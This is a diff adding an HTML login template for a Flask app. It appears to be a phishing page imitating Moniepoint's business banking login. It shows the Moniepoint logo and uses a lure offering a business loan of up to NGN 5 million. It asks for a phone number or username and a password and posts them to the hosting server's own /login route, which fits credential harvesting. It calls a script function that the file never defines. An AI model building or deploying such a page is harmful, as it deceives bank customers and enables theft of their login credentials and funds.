@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Business Banking Login</title>
+    <!-- Link to external CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="login-container">
+        <img src="{{ url_for('static', filename='63c1cc8dbf4087450199b427_Moniepoint.png') }}" alt="Company Logo" class="logo">
+        <h1>Business Banking Login</h1>
+        <h2>Log In To Apply For Moniepoint Medium Business Loan Up To NGN 5 Million Naira</h2>        
+        <div class="switch-btn">
+            <label>
+                <input type="radio" name="loginMethod" value="phone" checked onchange="toggleLoginMethod()"> Phone
+            </label>
+            <label>
+                <input type="radio" name="loginMethod" value="username" onchange="toggleLoginMethod()"> Username
+            </label>
+        </div>
+        <form method="POST" action="/login">
+            <input type="text" id="username" name="username" placeholder="Username" style="display: none;">
+            <div id="phoneFieldWrapper">
+                <input type="tel" id="phone" name="phone" placeholder="Phone Number">
+            </div>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+            <div id="errorMessage" class="error-message"></div>
+        </form>
+    </div>
+</body>
+</html>
